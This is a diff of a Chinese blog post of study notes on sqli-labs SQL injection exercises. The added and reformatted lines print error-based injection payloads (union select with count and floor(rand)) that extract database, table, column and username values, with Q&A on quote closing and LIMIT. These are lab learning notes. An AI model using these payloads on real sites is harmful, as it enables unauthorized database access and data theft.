@@ -184,6 +184,7 @@
 “)and 1=2–+
 
 “))and 1=2–+</code></pre><p>一般的代码为： $id=$_GET[‘id’]; $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; 此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思 路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）</p>
+<p>(<strong>下面有的符号我打进去的时候没有改成英文输入法，所以直接复制可能有错</strong>)</p>
 <h2 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h2><h4 id="1-判断是数字型还是字符型"><a href="#1-判断是数字型还是字符型" class="headerlink" title="1.判断是数字型还是字符型"></a>1.判断是数字型还是字符型</h4><p> 得字符型</p>
 <p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513205214145.png" alt="image-20200513205214145"></p>
 <p><strong>问题1：我不是很理解报错这句话limit后面的意思，不明白1后面为啥有个单引号？</strong></p>
@@ -290,10 +291,10 @@ $row = mysqli_fetch_array($result, MYSQLI_BOTH);
 <p>4）查询派生表：</p>
 <p>select 1 from (select count(<em>), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()</em>2))as a from information_schema.tables group by a)x;</p>
 </blockquote>
-<h4 id="2-payload："><a href="#2-payload：" class="headerlink" title="2.payload："></a>2.payload：</h4><p>1）输入?id=-1’ union select 1,count(<em>),concat(database(),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到数据库名</p>
-<p>2）输入?id=-1’ union select 1,count(<em>),concat((select table_name from information_schema.tables where table_schema=”security” limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到表名</p>
-<p>3）输入?id=-1’ union select 1,count(<em>),concat((select column_name from information_schema.columns where table_name=’users’ limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到users表的字段</p>
-<p>4）输入?id=-1’ union select 1,count(<em>),concat((select username from security.users limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到users表的username字段的值</p>
+<h4 id="2-payload："><a href="#2-payload：" class="headerlink" title="2.payload："></a>2.payload：</h4><p>1）输入<code>?id=-1&#39; union select 1,count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x;--+</code> 得到数据库名</p>
+<p>2）输入<code>?id=-1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;--+</code> 得到表名</p>
+<p>3）输入<code>?id=-1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;--+</code> 得到users表的字段</p>
+<p>4）输入<code>?id=-1&#39; union select 1,count(*),concat((select username from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;--+</code> 得到users表的username字段的值</p>
 <p><strong>问题6</strong>：可是明明就没有爆出users这个表名，只得到referers,怎么才能看到所有的表名呢？</p>
 <p>答：会对此产生疑问是因为没有理解limit（1,1）；LIMIT m,n指从第m+1条开始，取n条。该题只能显示一条，所以n=2的时候会报错。当m=3的时候出来的表名就是users。</p>
 <h2 id="报错的类型："><a href="#报错的类型：" class="headerlink" title="报错的类型："></a>报错的类型：</h2><p>参考博客：<a href="https://blog.csdn.net/weixin_42277564/article/details/80635586" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42277564/article/details/80635586</a></p>
